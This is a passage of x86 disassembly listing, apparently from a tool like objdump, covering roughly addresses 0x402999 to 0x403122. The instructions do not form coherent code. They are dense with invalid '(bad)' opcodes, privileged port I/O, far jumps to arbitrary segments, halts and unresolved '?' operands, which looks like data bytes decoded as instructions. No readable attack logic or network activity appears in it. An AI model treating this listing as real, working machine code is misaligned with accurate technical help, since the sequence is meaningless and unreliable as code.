  402999:	and    eax,0xcbcab4b9
  40299e:	and    ecx,DWORD PTR [eax]
  4029a0:	inc    edx
  4029a1:	jb     0x4029c7
  4029a3:	scas   al,BYTE PTR es:[edi]
  4029a4:	enter  0x148c,0x40
  4029a8:	xchg   DWORD PTR [ebx-0x52b534b0],ebp
  4029ae:	inc    ebp
  4029af:	push   0xffffffe7
  4029b1:	fidivr WORD PTR [ebx]
  4029b3:	cwde   
  4029b4:	ret    0x1447
  4029b7:	mov    WORD PTR [eax+0x3b],?
  4029ba:	mov    bh,0xde
  4029bc:	inc    esp
  4029bd:	mov    ebx,0x2d353214
  4029c2:	dec    ebx
  4029c3:	jae    0x402989
  4029c5:	in     al,dx
  4029c6:	arpl   WORD PTR [esi+0x3c365c41],bp
  4029cc:	pop    es
  4029cd:	mov    ah,cl
  4029cf:	jmp    0xfb8b:0x4ab00dcb
  4029d6:	enter  0x135e,0x5a
  4029da:	dec    ecx
  4029db:	add    eax,0x19d1c29b
  4029e0:	push   ebx
  4029e1:	int3   
  4029e2:	cmp    al,0x74
  4029e4:	(bad)
  4029e7:	mov    dh,0x31
  4029e9:	xchg   esp,eax
  4029ea:	pop    ecx
  4029eb:	in     al,0x14
  4029ed:	add    eax,0x3a2d1dc9
  4029f2:	and    DWORD PTR [edx-0x50],ebx
  4029f5:	js     0x402a6b
  4029f7:	pop    ecx
  4029f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029f9:	lahf   
  4029fa:	lods   al,BYTE PTR ds:[esi]
  4029fb:	imul   ebx,DWORD PTR [ebx+0x148b0d1b],0xa188d882
  402a05:	jmp    0x30c0:0xbc09ac59
  402a0c:	gs lock sti 
  402a0f:	retf   
  402a10:	push   ebp
  402a11:	popfw  
  402a13:	jmp    0x54b0:0xcfa57407
  402a1a:	push   ss
  402a1b:	pop    ebx
  402a1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a1d:	mov    ecx,edi
  402a1f:	dec    edx
  402a20:	or     esp,DWORD PTR [ebp-0x305a7e76]
  402a26:	(bad)
  402a29:	rcl    DWORD PTR [ebx+0x5141237f],0xae
  402a30:	inc    edx
  402a31:	jg     0x402a0f
  402a33:	fucomip st,st(3)
  402a35:	(bad)  
  402a36:	or     eax,DWORD PTR [eax]
  402a38:	or     BYTE PTR [ebx+0x6b72b04f],0xb7
  402a3f:	add    edi,DWORD PTR [esi-0x10]
  402a42:	jne    0x402a11
  402a44:	shl    DWORD PTR [eax+0xfe71db7],1
  402a4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a4b:	pushf  
  402a4c:	ins    BYTE PTR es:[edi],dx
  402a4d:	cmp    esp,ecx
  402a4f:	xchg   DWORD PTR [edi+0x1ce6f97b],ebx
  402a55:	sbb    eax,0xe09e43c3
  402a5a:	adc    DWORD PTR [esi+0x76],eax
  402a5d:	hlt    
  402a5e:	stos   BYTE PTR es:[edi],al
  402a5f:	(bad)  
  402a60:	ret    0x1cd7
  402a63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a64:	mov    al,0xeb
  402a66:	xchg   ecx,eax
  402a67:	mov    eax,0xbcb8d24e
  402a6c:	sbb    bh,BYTE PTR [eax]
  402a6e:	add    al,0x85
  402a70:	mov    ds:0xd8349943,eax
  402a75:	es aad 0x35
  402a78:	sub    al,0x9d
  402a7a:	adc    al,0x59
  402a7c:	inc    ebp
  402a7d:	das    
  402a7e:	and    dl,BYTE PTR [eax+0x75]
  402a81:	test   al,0xa1
  402a83:	inc    ebp
  402a84:	das    
  402a85:	push   es
  402a86:	inc    ebp
  402a87:	daa    
  402a88:	mov    fs,WORD PTR [ebp+0x68bce609]
  402a8e:	into   
  402a8f:	int    0xfd
  402a91:	rol    DWORD PTR [ebp+eiz*4-0x634d2a71],1
  402a98:	(bad)  
  402a99:	adc    al,0x45
  402a9b:	inc    ecx
  402a9c:	inc    ebx
  402a9d:	fwait
  402a9e:	lock loopne 0x402a66
  402aa1:	jmp    0xbe18:0x4a3bdfb6
  402aa8:	cmp    al,0x38
  402aaa:	aaa    
  402aab:	add    al,0xd8
  402aad:	push   esi
  402aae:	je     0x402b0c
  402ab0:	xchg   edi,eax
  402ab2:	sbb    BYTE PTR [edi+0x1],ah
  402ab5:	cmp    DWORD PTR [edi+0x1d],ecx
  402ab8:	scas   eax,DWORD PTR es:[edi]
  402ab9:	jno    0x402a5a
  402abb:	leave  
  402abc:	lahf   
  402abd:	repnz addr16 dec edx
  402ac0:	into   
  402ac1:	adc    dh,BYTE PTR [edx]
  402ac3:	sbb    al,BYTE PTR [ebx+ecx*8]
  402ac6:	sub    edi,DWORD PTR [edi+0x78de3]
  402acc:	push   ds
  402acd:	inc    esp
  402ace:	jb     0x402a86
  402ad0:	fcom   DWORD PTR [esi+0x46]
  402ad3:	hlt    
  402ad4:	into   
  402ad5:	adc    al,0xf8
  402ad7:	fwait
  402ad8:	stos   DWORD PTR es:[edi],eax
  402ad9:	lahf   
  402ada:	mov    al,0x43
  402adc:	sar    BYTE PTR [esp+eax*2+0xe24a512],cl
  402ae3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ae4:	push   ds
  402ae5:	out    dx,al
  402ae6:	jnp    0x402b65
  402ae8:	cld    
  402ae9:	sub    DWORD PTR [eax+0x53],ebp
  402aec:	xchg   ecx,eax
  402aed:	jl     0x402aed
  402aef:	xor    BYTE PTR [ecx-0x311b48f0],bh
  402af5:	mov    WORD PTR [ebx],?
  402af7:	retf   0x4c8b
  402afa:	and    eax,0x62ea706c
  402aff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b00:	stos   BYTE PTR es:[edi],al
  402b01:	stos   DWORD PTR es:[edi],eax
  402b02:	dec    ebx
  402b03:	jns    0x402aa2
  402b05:	mov    dh,0xa1
  402b07:	xchg   ebp,eax
  402b08:	cld    
  402b09:	xchg   DWORD PTR [ecx+0x7f],eax
  402b0c:	push   edx
  402b0d:	jnp    0x402adb
  402b0f:	inc    esp
  402b10:	sub    bh,BYTE PTR [ebp+0x170800ab]
  402b16:	add    al,0xd1
  402b18:	leave  
  402b19:	ret    
  402b1a:	push   0xffffffbd
  402b1c:	popf   
  402b1d:	das    
  402b1e:	loopne 0x402ae9
  402b20:	mov    al,0x32
  402b22:	mov    eax,0x15c8ae4e
  402b27:	data16 and al,0x69
  402b2a:	push   es
  402b2b:	jae    0x402b4f
  402b2d:	sbb    eax,0x4d5e63f2
  402b33:	popa   
  402b34:	pop    edi
  402b35:	call   0xfe8b:0xc802fceb
  402b3c:	push   cs
  402b3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b3e:	(bad)  
  402b40:	adc    al,0x5
  402b42:	stc    
  402b43:	xor    cl,dh
  402b45:	dec    esi
  402b46:	mov    bl,0x73
  402b48:	cld    
  402b49:	fcomp  DWORD PTR [esi-0x12]
  402b4c:	inc    edx
  402b4d:	mov    esi,DWORD PTR [edx-0x6c663f49]
  402b53:	pop    ds
  402b54:	imul   esp,DWORD PTR [ecx+0x2],0xfffffff4
  402b58:	and    esi,DWORD PTR [ebp+edx*2+0x1b845fbb]
  402b5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b60:	fucomi st,st(6)
  402b62:	fldenv [edx-0x399b3b6e]
  402b68:	cmp    cl,dh
  402b6a:	jmp    0x402b14
  402b6c:	in     eax,0xf4
  402b6e:	std    
  402b6f:	fild   QWORD PTR [edx]
  402b71:	cld    
  402b72:	push   cs
  402b73:	fst    QWORD PTR [edx+0x9255c60]
  402b79:	arpl   si,bx
  402b7b:	out    0x76,al
  402b7d:	inc    ebp
  402b7e:	xor    bh,BYTE PTR [edx-0x7e181a86]
  402b84:	push   ecx
  402b85:	out    0xf1,al
  402b87:	mov    ah,0x39
  402b89:	cmp    ebx,edx
  402b8b:	dec    esp
  402b8c:	fcmovu st,st(0)
  402b8e:	rcr    bh,1
  402b90:	or     al,0x2a
  402b92:	pop    esi
  402b93:	mov    bh,0xc
  402b95:	dec    ebp
  402b96:	inc    edx
  402b97:	mov    ds:0x22ec92ad,al
  402b9c:	shr    BYTE PTR [edx+0x5a650c5b],0x9
  402ba3:	adc    eax,0xb675b6ec
  402ba8:	mov    cl,0x32
  402baa:	pop    edx
  402bab:	cmp    DWORD PTR [eax+0x4501ef9b],esi
  402bb1:	cli    
  402bb2:	inc    edx
  402bb3:	sahf   
  402bb4:	(bad)  
  402bb5:	js     0x402bff
  402bb7:	jge    0x402c36
  402bb9:	add    ah,BYTE PTR [edi]
  402bbb:	fnstsw WORD PTR [ebx-0xd]
  402bbe:	push   ds
  402bbf:	data16 or BYTE PTR [edx+eax*8+0x2680bb47],0xd9
  402bc8:	xor    DWORD PTR [esi+0x6cde97fc],eax
  402bce:	sti    
  402bcf:	sub    eax,0xc3d193e9
  402bd4:	sbb    ebx,DWORD PTR [edx-0x56b9c0c9]
  402bda:	dec    ebx
  402bdb:	sbb    al,0x35
  402bdd:	sbb    ch,BYTE PTR [esi]
  402bdf:	jbe    0x402c4f
  402be1:	add    ah,cl
  402be3:	add    BYTE PTR [ebp+0x472821f8],ah
  402be9:	das    
  402bea:	outs   dx,BYTE PTR ds:[esi]
  402beb:	pop    edi
  402bec:	fst    DWORD PTR [ebx+0x7bbc959d]
  402bf2:	mov    ebx,0x8f9975f4
  402bf7:	cli    
  402bf8:	scas   eax,DWORD PTR es:[edi]
  402bf9:	and    BYTE PTR [ebp+ecx*2-0x23],cl
  402bfd:	rcl    BYTE PTR [eax],cl
  402bff:	add    ah,BYTE PTR [ecx+0xf]
  402c02:	mov    al,ds:0x5b9a947a
  402c07:	mov    edx,0x709d6163
  402c0c:	adc    eax,0x38b3c83e
  402c11:	dec    ebx
  402c12:	out    dx,al
  402c13:	nop
  402c14:	mov    ah,0x8c
  402c16:	add    ebx,DWORD PTR [edx-0x4e]
  402c19:	inc    eax
  402c1a:	cdq    
  402c1b:	les    ecx,FWORD PTR [edx-0x42]
  402c1e:	or     esi,eax
  402c20:	jle    0x402c0c
  402c22:	arpl   bx,di
  402c24:	cmp    eax,0x525848bc
  402c29:	shl    DWORD PTR [eax],1
  402c2b:	mov    al,0x86
  402c2d:	in     eax,dx
  402c2e:	retf   
  402c2f:	aad    0x9e
  402c31:	jp     0x402c8c
  402c33:	fisttp WORD PTR [ebp+0x4cfe96f8]
  402c39:	stos   BYTE PTR es:[edi],al
  402c3a:	ret    0x18d5
  402c3d:	pop    ss
  402c3e:	sub    DWORD PTR [eax+ecx*4-0x70],ecx
  402c42:	adc    al,BYTE PTR [edi-0x6f]
  402c45:	enter  0xce2,0x9b
  402c49:	mov    esi,0xf6a1637e
  402c4e:	dec    edx
  402c4f:	mov    esp,0xa411ad1f
  402c54:	retf   0x17c6
  402c57:	jns    0x402cc0
  402c59:	je     0x402cb4
  402c5b:	mov    edx,0xa5ebb73c
  402c60:	lds    esi,FWORD PTR [eax+ecx*8+0x0]
  402c64:	xlat   BYTE PTR ds:[ebx]
  402c65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c66:	adc    al,0x1b
  402c68:	push   ebx
  402c69:	xor    dh,BYTE PTR es:[esi*4-0x4535b1a8]
  402c71:	sub    BYTE PTR [ebx+0x1cb61878],dl
  402c77:	mov    BYTE PTR ss:[edi],dl
  402c7a:	addr16 cmc 
  402c7c:	dec    edx
  402c7d:	xchg   bh,bl
  402c7f:	cmc    
  402c80:	cdq    
  402c81:	or     eax,0x193e199
  402c86:	(bad)  
  402c87:	mov    ebx,0x141fe14a
  402c8c:	fwait
  402c8d:	sbb    al,BYTE PTR ds:0x1e49e83b
  402c93:	dec    esi
  402c94:	xchg   esp,eax
  402c95:	push   ss
  402c96:	scas   eax,DWORD PTR es:[edi]
  402c97:	jae    0x402c7d
  402c99:	outs   dx,BYTE PTR ds:[esi]
  402c9a:	rcl    BYTE PTR fs:[eax],cl
  402c9d:	retf   
  402c9e:	and    BYTE PTR ds:0x8515232a,ch
  402ca4:	dec    eax
  402ca5:	popa   
  402ca6:	xor    al,bh
  402ca8:	fmul   QWORD PTR ds:0x7dbed09a
  402cae:	hlt    
  402caf:	call   0xe133:0xbb85423e
  402cb6:	mov    DWORD PTR [ebx-0x49],esi
  402cb9:	push   edx
  402cba:	push   esp
  402cbb:	push   eax
  402cbc:	dec    ebp
  402cbd:	jp     0x402c81
  402cbf:	mov    ecx,0xa3a0e7ef
  402cc4:	mov    ds:0xe19e41f0,eax
  402cc9:	out    dx,al
  402cca:	icebp  
  402ccb:	aaa    
  402ccc:	sar    BYTE PTR [edi-0x1523fca3],0x6e
  402cd3:	push   ss
  402cd4:	jl     0x402d08
  402cd6:	loope  0x402cd4
  402cd8:	mov    ebx,0x23e5f784
  402cdd:	ins    BYTE PTR es:[edi],dx
  402cde:	cld    
  402cdf:	arpl   WORD PTR [edi-0x5cadfe93],bx
  402ce5:	cmp    dh,BYTE PTR [ecx-0x51]
  402ce8:	mov    edx,0x21b2ba3b
  402ced:	adc    al,0xde
  402cef:	sbb    BYTE PTR [ecx+0x9],0x1c
  402cf3:	add    BYTE PTR [esi-0x43],cl
  402cf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cf7:	cwde   
  402cf8:	mov    edi,0xd1da011b
  402cfd:	adc    bl,BYTE PTR [esi+0x32]
  402d00:	aam    0x21
  402d02:	sbb    edi,DWORD PTR [ecx-0x5be3e556]
  402d08:	std    
  402d09:	inc    esi
  402d0a:	xor    eax,0x27f127ac
  402d0f:	jae    0x402d37
  402d11:	sub    BYTE PTR [ecx+0x7a46a91f],cl
  402d17:	lods   eax,DWORD PTR ds:[esi]
  402d18:	pop    es
  402d19:	add    DWORD PTR [ecx-0x2d3c4af0],eax
  402d1f:	ret    0xbabc
  402d22:	inc    esi
  402d23:	lods   al,BYTE PTR ds:[esi]
  402d24:	lea    esp,[ebx+0x3b]
  402d27:	inc    edx
  402d28:	mov    bh,0xad
  402d2a:	or     eax,0xe658657d
  402d2f:	dec    ebp
  402d30:	mov    al,ds:0x7d9adada
  402d35:	outs   dx,DWORD PTR ds:[esi]
  402d36:	(bad)
  402d3a:	aas    
  402d3b:	mov    cl,0xf
  402d3d:	cli    
  402d3e:	push   ebp
  402d3f:	dec    edi
  402d40:	jmp    0xe099:0xeb4bed95
  402d47:	xchg   BYTE PTR [esi],bl
  402d49:	bnd jl 0x402d7e
  402d4c:	jge    0x402d62
  402d4e:	outs   dx,DWORD PTR ds:[esi]
  402d4f:	ins    DWORD PTR es:[edi],dx
  402d50:	pop    es
  402d51:	imul   BYTE PTR [ecx+0x55]
  402d54:	aad    0x62
  402d56:	addr16 or al,0xd1
  402d59:	lahf   
  402d5a:	andps  xmm5,XMMWORD PTR [edx+0x60]
  402d5e:	pop    ds
  402d5f:	retf   
  402d60:	pop    esi
  402d61:	mov    eax,ds:0xd414c4f5
  402d66:	in     al,0xbb
  402d68:	sbb    edx,ebx
  402d6a:	jle    0x402d46
  402d6c:	cli    
  402d6d:	cmp    ebx,DWORD PTR [ebp+0x6e]
  402d70:	sbb    DWORD PTR [ebx],ebp
  402d72:	and    cl,BYTE PTR [ecx+0x4d09afbe]
  402d78:	push   esi
  402d79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d7a:	int3   
  402d7b:	ret    
  402d7c:	adc    esi,ebx
  402d7e:	addr16 or ebp,esi
  402d81:	scas   eax,DWORD PTR es:[edi]
  402d82:	mul    BYTE PTR [esp+ecx*1-0xd]
  402d86:	xchg   edx,eax
  402d87:	sub    DWORD PTR [ebx],eax
  402d89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d8a:	push   ebx
  402d8b:	aaa    
  402d8c:	mov    al,ds:0x7f08d134
  402d91:	int3   
  402d92:	fmul   st,st(5)
  402d94:	push   ecx
  402d95:	or     esi,DWORD PTR [ecx-0x21923996]
  402d9b:	mov    esp,0x37cd3d38
  402da0:	pop    es
  402da1:	push   esi
  402da2:	shl    DWORD PTR [edx-0x52],1
  402da5:	mov    gs,WORD PTR [ebp+0x50]
  402da8:	inc    eax
  402da9:	xor    dh,BYTE PTR [ecx]
  402dab:	and    edi,DWORD PTR [ebp+0x6742fc6c]
  402db1:	jle    0x402d6c
  402db3:	cmp    DWORD PTR [edi-0x5475f20d],esp
  402db9:	cmp    BYTE PTR [edx],bh
  402dbb:	dec    ecx
  402dbc:	jae    0x402d8b
  402dbe:	rcl    DWORD PTR [ecx-0x685296f3],cl
  402dc4:	out    dx,eax
  402dc5:	popf   
  402dc6:	fptan  
  402dc8:	xchg   cl,bl
  402dca:	adc    eax,0x9c372b2
  402dcf:	rol    BYTE PTR [esi+0x36],cl
  402dd2:	dec    ecx
  402dd3:	mov    cl,BYTE PTR [ecx]
  402dd5:	clc    
  402dd6:	mov    ds:0x57c8df64,eax
  402ddb:	dec    edi
  402ddc:	add    DWORD PTR [edx],0x27
  402ddf:	jo     0x402de2
  402de1:	add    esi,edx
  402de3:	imul   ebx,esi,0xa73770e8
  402de9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402dea:	inc    eax
  402deb:	shr    DWORD PTR [ecx],0x1a
  402dee:	push   0x46b85de7
  402df3:	and    DWORD PTR [ebp+0x4e],ebp
  402df6:	mov    bl,0x2f
  402df8:	popa   
  402df9:	(bad)  
  402dfa:	stos   BYTE PTR es:[edi],al
  402dfb:	and    ecx,DWORD PTR [edi+eiz*2+0x1172f89a]
  402e02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e03:	jecxz  0x402dc0
  402e05:	ins    BYTE PTR es:[edi],dx
  402e06:	lds    ebx,FWORD PTR [ebx+0x532ba514]
  402e0c:	adc    edx,DWORD PTR [ebx+ecx*4-0x2a]
  402e10:	mov    al,ds:0x1cf9d805
  402e15:	xlat   BYTE PTR ds:[ebx]
  402e16:	mov    esi,0x15fa00d0
  402e1b:	pushf  
  402e1c:	push   esi
  402e1d:	sar    dl,0xc8
  402e20:	sub    dh,BYTE PTR ds:0xa549b483
  402e26:	jecxz  0x402e41
  402e28:	xor    al,0xe5
  402e2a:	loop   0x402e2a
  402e2c:	lods   eax,DWORD PTR ds:[esi]
  402e2d:	cmp    eax,0xab677b33
  402e32:	xchg   esi,eax
  402e33:	out    0xf1,al
  402e35:	stos   DWORD PTR es:[edi],eax
  402e36:	fld    DWORD PTR [eax]
  402e38:	fsubr  st,st(6)
  402e3a:	xor    bh,BYTE PTR [edx-0x26]
  402e3d:	das    
  402e3e:	mov    bh,0x3d
  402e40:	stc    
  402e41:	add    al,0xeb
  402e43:	jbe    0x402dce
  402e45:	(bad)
  402e49:	mov    ds:0xc071bbb3,eax
  402e4e:	shl    ebx,cl
  402e50:	imul   eax,DWORD PTR [ebx+ebx*4-0x8],0x72
  402e55:	cmp    eax,edi
  402e57:	or     BYTE PTR [esi-0x6c],ah
  402e5a:	fs sahf 
  402e5c:	xlat   BYTE PTR ds:[ebx]
  402e5d:	pop    esi
  402e5e:	out    dx,al
  402e5f:	push   0x3e80f8ac
  402e64:	push   0x461bfe8d
  402e69:	sbb    eax,0x1ccb8425
  402e6e:	mov    ecx,0x6207027c
  402e73:	ins    BYTE PTR es:[edi],dx
  402e74:	(bad)  
  402e75:	fimul  DWORD PTR [edx+0x63404229]
  402e7b:	mov    ?,ebp
  402e7d:	rcr    BYTE PTR [edi+0x17],cl
  402e80:	je     0x402e93
  402e82:	jne    0x402e55
  402e84:	jle    0x402e35
  402e86:	jo     0x402e22
  402e88:	inc    ebx
  402e89:	into   
  402e8a:	push   esi
  402e8b:	mul    BYTE PTR [edi]
  402e8d:	or     bl,cl
  402e8f:	test   DWORD PTR [ecx+0x20073907],0xfa9842d9
  402e99:	push   es
  402e9a:	std    
  402e9b:	popa   
  402e9c:	inc    ebx
  402e9d:	cmp    al,0x9c
  402e9f:	sbb    eax,0x758ae4d6
  402ea4:	or     BYTE PTR [eax+0xa38ea17],ch
  402eaa:	xchg   esp,eax
  402eab:	push   ds
  402eac:	xor    DWORD PTR [edx-0x2e674e06],edx
  402eb2:	repz scas al,BYTE PTR es:[edi]
  402eb4:	and    ah,BYTE PTR [edi+0x17]
  402eb7:	add    al,0x6b
  402eb9:	mov    WORD PTR [ebp+ecx*8+0x4aea36b5],?
  402ec0:	pop    edx
  402ec1:	shr    BYTE PTR [ebx],1
  402ec3:	inc    esi
  402ec4:	cmp    DWORD PTR [edx+ecx*8-0x267d195],esi
  402ecb:	sti    
  402ecc:	lods   al,BYTE PTR ds:[esi]
  402ecd:	fisub  DWORD PTR [eax+0x37a37d3a]
  402ed3:	sub    al,0x4d
  402ed5:	push   edi
  402ed6:	or     eax,0x11e50614
  402edb:	loop   0x402e60
  402edd:	push   ecx
  402ede:	cmp    BYTE PTR [ecx],dh
  402ee0:	xor    DWORD PTR [ebp+0x15],edi
  402ee3:	fnstcw WORD PTR [edx]
  402ee5:	out    dx,eax
  402ee6:	mov    ch,0xd8
  402ee8:	jmp    0x402ed4
  402eea:	pusha  
  402eeb:	in     al,0xcc
  402eed:	inc    esp
  402eee:	fld    TBYTE PTR [edx-0x4b]
  402ef1:	ret    0xc285
  402ef4:	cmp    esi,DWORD PTR [eax+edx*8+0x5e]
  402ef8:	pop    ds
  402ef9:	sti    
  402efa:	adc    al,0x2b
  402efc:	ss dec ebp
  402efe:	push   ss
  402eff:	xor    al,BYTE PTR [ecx+edi*2+0x110aacc8]
  402f06:	jecxz  0x402eea
  402f08:	or     eax,0xdc4ef770
  402f0d:	mov    DWORD PTR [esi-0x47],edi
  402f10:	cmp    dh,BYTE PTR [esi-0x18]
  402f13:	outs   dx,BYTE PTR ds:[esi]
  402f14:	ds repz fs data16 jmp 0x402f5e
  402f1a:	mov    ecx,0xec4be8e5
  402f1f:	cmovge edi,DWORD PTR [ebx+ebp*4+0x5b]
  402f24:	add    BYTE PTR [eax+0x1ffc2b11],0x32
  402f2b:	mov    dh,0x76
  402f2d:	inc    esp
  402f2e:	test   DWORD PTR [eax-0x28],esi
  402f31:	ds sbb al,0x64
  402f34:	nop
  402f35:	adc    eax,0x3fae72d1
  402f3a:	dec    ecx
  402f3b:	std    
  402f3c:	loop   0x402f8b
  402f3e:	xchg   ebx,eax
  402f3f:	popf   
  402f40:	jecxz  0x402f31
  402f42:	punpckhbw mm3,QWORD PTR [eax-0xa17f7af]
  402f49:	pop    ss
  402f4a:	dec    DWORD PTR [ebx-0x3f]
  402f4d:	mov    al,ds:0x91e12ba3
  402f52:	in     al,0x1b
  402f54:	int    0x93
  402f56:	adc    eax,DWORD PTR [ecx]
  402f58:	repz lock pushf 
  402f5b:	sbb    DWORD PTR [ebp+esi*4-0x652a88ca],0xcb55995a
  402f66:	sbb    dl,ah
  402f68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f69:	add    ebx,0xffffffdd
  402f6c:	fsubr  st(3),st
  402f6e:	fimul  WORD PTR [ecx+0x2e]
  402f71:	in     eax,dx
  402f72:	mov    edx,0x96665386
  402f77:	inc    esp
  402f78:	inc    eax
  402f79:	xor    ah,BYTE PTR [esi+0x1fc44f2b]
  402f7f:	xchg   esi,eax
  402f80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f81:	xchg   ebx,eax
  402f82:	fild   QWORD PTR [ebx+0xda0b208]
  402f88:	mov    dl,0x9d
  402f8a:	dec    esp
  402f8b:	xchg   DWORD PTR [edi],eax
  402f8d:	pop    ebx
  402f8e:	adc    DWORD PTR [edx+edx*2+0x2edc1295],ecx
  402f95:	out    0xea,eax
  402f97:	push   esi
  402f98:	add    ch,BYTE PTR [edi+0x2d3bac5a]
  402f9e:	pusha  
  402f9f:	pusha  
  402fa0:	(bad)  
  402fa1:	iret   
  402fa2:	and    DWORD PTR [ebx],esi
  402fa4:	aas    
  402fa5:	pop    esi
  402fa6:	add    bl,BYTE PTR [edi]
  402fa8:	arpl   WORD PTR [edi],cx
  402faa:	inc    edx
  402fab:	sbb    DWORD PTR [ebp+0x2e],edi
  402fae:	ss push ecx
  402fb0:	mov    ah,0x5a
  402fb2:	push   eax
  402fb3:	dec    eax
  402fb4:	std    
  402fb5:	and    edi,edx
  402fb7:	ins    DWORD PTR es:[edi],dx
  402fb8:	outs   dx,BYTE PTR ds:[esi]
  402fb9:	lock pop ss
  402fbb:	rcl    DWORD PTR [ebx],1
  402fbd:	loope  0x402fc2
  402fbf:	ja     0x402f44
  402fc1:	stos   BYTE PTR es:[edi],al
  402fc2:	sub    al,0x79
  402fc4:	(bad)  
  402fc5:	shl    DWORD PTR [ecx-0x7e],1
  402fc8:	lds    edx,FWORD PTR [ecx]
  402fca:	pop    ecx
  402fcb:	jne    0x402f8c
  402fcd:	icebp  
  402fce:	sbb    ebp,DWORD PTR [ecx-0xe278d3b]
  402fd4:	cmp    ah,BYTE PTR [ecx-0x57]
  402fd7:	pop    ecx
  402fd8:	mov    al,0xb
  402fda:	arpl   sp,si
  402fdc:	out    0xaf,al
  402fde:	mov    BYTE PTR [edx+esi*2],ch
  402fe1:	(bad)  [ecx+0x5ebb74d9]
  402fe7:	add    ah,BYTE PTR [eax+0x32]
  402fea:	nop
  402feb:	mov    bl,0x49
  402fed:	add    ecx,ecx
  402fef:	jo     0x402f8e
  402ff1:	hlt    
  402ff2:	int    0x40
  402ff4:	xor    ecx,0xffffff92
  402ff7:	xor    BYTE PTR [ebp-0x66],ch
  402ffa:	mov    ds:0xdbf90c05,eax
  402fff:	cwde   
  403000:	xchg   esp,eax
  403001:	push   eax
  403002:	jne    0x403029
  403004:	scas   al,BYTE PTR es:[edi]
  403005:	or     al,0x5b
  403007:	add    eax,edx
  403009:	ds int 0xfc
  40300c:	(bad)  
  40300d:	pusha  
  40300e:	dec    ecx
  40300f:	test   eax,0x1b0d2887
  403014:	call   0x21e2770b
  403019:	shl    esi,cl
  40301b:	cmp    DWORD PTR [edx+ecx*4],ebx
  40301e:	and    DWORD PTR [ecx],edi
  403020:	pusha  
  403021:	and    DWORD PTR [edi-0x10],eax
  403024:	mov    eax,0x8b8670fb
  403029:	ins    DWORD PTR es:[edi],dx
  40302a:	(bad)  
  40302b:	fldenv [edx-0x5d72434d]
  403031:	mov    edx,0xe1dd5f5f
  403036:	(bad)  
  403037:	lahf   
  403038:	in     al,0xb3
  40303a:	mov    eax,ds:0xf05213cf
  40303f:	(bad)  
  403040:	outs   dx,BYTE PTR ds:[esi]
  403041:	pop    eax
  403042:	push   es
  403043:	aas    
  403044:	mov    bh,0xd7
  403046:	adc    DWORD PTR [ecx-0x23],esi
  403049:	push   0xffffffcb
  40304b:	mov    ch,0xc6
  40304d:	cmp    al,0xc6
  40304f:	out    0x3e,eax
  403051:	int    0xfb
  403053:	lahf   
  403054:	jmp    0x4030ac
  403056:	or     DWORD PTR [edx+0xaa16d7c],edi
  40305c:	cld    
  40305d:	clc    
  40305e:	into   
  40305f:	fdivp  st(6),st
  403061:	and    al,bl
  403063:	and    al,0x97
  403065:	adc    ebp,DWORD PTR [ebx]
  403067:	(bad)  
  403069:	and    BYTE PTR [ebx-0x124e4065],cl
  40306f:	mov    ebx,0x42fe51ad
  403074:	xor    BYTE PTR [edx-0x8],al
  403077:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403078:	dec    ecx
  403079:	xchg   esp,eax
  40307a:	mov    cl,0x58
  40307c:	push   esi
  40307d:	push   0x1b
  40307f:	mov    eax,0x956c3db1
  403084:	je     0x4030d3
  403086:	inc    esi
  403087:	dec    eax
  403088:	daa    
  403089:	pop    ecx
  40308a:	(bad)  [ebp+0x2503204d]
  403090:	mov    eax,ds:0x8e0eaa59
  403095:	std    
  403096:	addr16 mov ebx,0x6abec7
  40309c:	cdq    
  40309d:	(bad)  
  40309e:	push   esi
  40309f:	dec    esi
  4030a0:	hlt    
  4030a1:	enter  0xd95e,0xef
  4030a5:	inc    ecx
  4030a6:	xor    eax,0x9543d7c1
  4030ab:	xchg   edx,eax
  4030ac:	gs mov al,0x32
  4030af:	jecxz  0x40303a
  4030b1:	rcr    DWORD PTR [ebx],0xc0
  4030b4:	or     BYTE PTR [edx+0x7e1be886],dl
  4030ba:	rcr    BYTE PTR ss:[edi+0x7e30abd2],cl
  4030c1:	sti    
  4030c2:	das    
  4030c3:	cli    
  4030c4:	mov    ds:0x197b5f12,al
  4030c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030ca:	dec    ebx
  4030cb:	in     eax,0x10
  4030cd:	adc    al,0xd0
  4030cf:	(bad)  
  4030d0:	sbb    BYTE PTR [eax+0x4b3a8a54],ah
  4030d6:	(bad)  
  4030d7:	shr    DWORD PTR ds:0xf241b628,1
  4030dd:	cmp    eax,0xa49b925
  4030e2:	mov    esi,DWORD PTR [ecx+0x5e]
  4030e5:	push   esi
  4030e6:	lods   al,BYTE PTR ds:[esi]
  4030e7:	xlat   BYTE PTR ds:[ebx]
  4030e8:	fistp  WORD PTR [ebp-0x1da9859]
  4030ee:	inc    edi
  4030ef:	mov    ebx,0x9d66845a
  4030f4:	call   0x1740:0xa7de8b34
  4030fb:	xor    DWORD PTR [esi+0x1b],0x5ec7c8fc
  403102:	inc    edi
  403103:	mov    al,0x58
  403105:	xor    eax,0x24cd2beb
  40310a:	xor    ah,BYTE PTR [eax-0xd]
  40310d:	xchg   ecx,eax
  40310e:	pop    edi
  40310f:	addr16 push 0xffffffb9
  403112:	pop    esp
  403113:	jo     0x40311a
  403115:	pop    esp
  403116:	daa    
  403117:	test   al,bl
  403119:	mov    al,ds:0x1af38c47
  40311e:	popa   
  40311f:	into   
  403120:	out    0x34,eax
  403122:	arpl   WORD PTR [bx+di+0x79e6],di
